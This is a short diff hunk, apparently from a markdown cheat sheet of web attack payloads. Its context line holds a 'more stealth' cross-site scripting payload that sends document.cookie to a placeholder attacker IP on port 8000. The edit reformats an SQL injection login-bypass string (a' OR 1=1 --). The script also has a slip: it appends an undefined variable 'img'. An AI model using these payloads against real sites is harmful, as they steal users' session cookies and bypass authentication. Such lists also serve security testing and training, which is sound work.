@@ -35,9 +35,8 @@ More stealth, use this one
 
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
     
-###**SQLI**
-
-```-a' OR 1=1 --```
+### SqlI
+    a' OR 1=1 --
 
 		
 
